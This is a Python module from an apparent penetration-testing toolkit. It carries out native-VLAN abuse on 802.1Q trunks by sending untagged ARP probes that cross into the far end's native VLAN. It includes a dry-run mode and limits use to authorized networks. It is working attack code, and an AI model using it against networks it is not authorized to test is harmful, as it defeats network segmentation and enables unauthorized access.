"""Native VLAN abuse: untagged frames enter whatever VLAN the far end treats as native.

On an 802.1Q trunk, frames of the native VLAN travel untagged. The two ends of the
trunk must agree on which VLAN is native. When they do not, an untagged frame that
one side sends as its native VLAN arrives at the other side in a different VLAN,
the far end's native VLAN. An attacker on the native VLAN of its own port can
therefore send traffic into a VLAN it does not belong to, without any tag.

This module sends untagged probes, which is all the attacker needs to send. Which
VLAN the probes enter depends on the mismatch between the two ends of the trunk, so
the result must be checked on the far end.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import BROADCAST_MAC, Runner, normalize_unicast_mac, read_interface_mac, run_command

ARP_REQUEST = 1
ZERO_IP = "0.0.0.0"
ZERO_MAC = "00:00:00:00:00:00"


@dataclass(frozen=True)
class NativeVlanConfig:
    iface: str                  # attacker interface, on the native VLAN of its trunk port
    probe_ip: str = "192.0.2.1" # address in the probe ARP request (documentation range by default)
    count: int = 0              # untagged probes to send; 0 = until stopped
    interval: float = 1.0       # seconds between probes
    dry_run: bool = False       # build probes but do not send them

    def __post_init__(self) -> None:
        parse_ipv4(self.probe_ip, "probe IP")


@dataclass
class NativeVlanStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def build_untagged_probe(sender_mac: str, probe_ip: str) -> Packet:
    """Untagged ARP probe (sender 0.0.0.0) for `probe_ip`, as native-VLAN traffic."""
    mac = normalize_unicast_mac(sender_mac)
    return Ether(src=mac, dst=BROADCAST_MAC) / ARP(
        op=ARP_REQUEST, hwsrc=mac, psrc=ZERO_IP, hwdst=ZERO_MAC, pdst=probe_ip,
    )


def run_native_vlan_abuse(
    config: NativeVlanConfig,
    stop_event: threading.Event,
    on_progress: Callable[[NativeVlanStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> NativeVlanStats:
    """Send untagged probes until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = NativeVlanStats(
            status="Dry run: would send untagged probes, which the far end places in its native VLAN. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = NativeVlanStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_untagged_probe(sender_mac, config.probe_ip), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
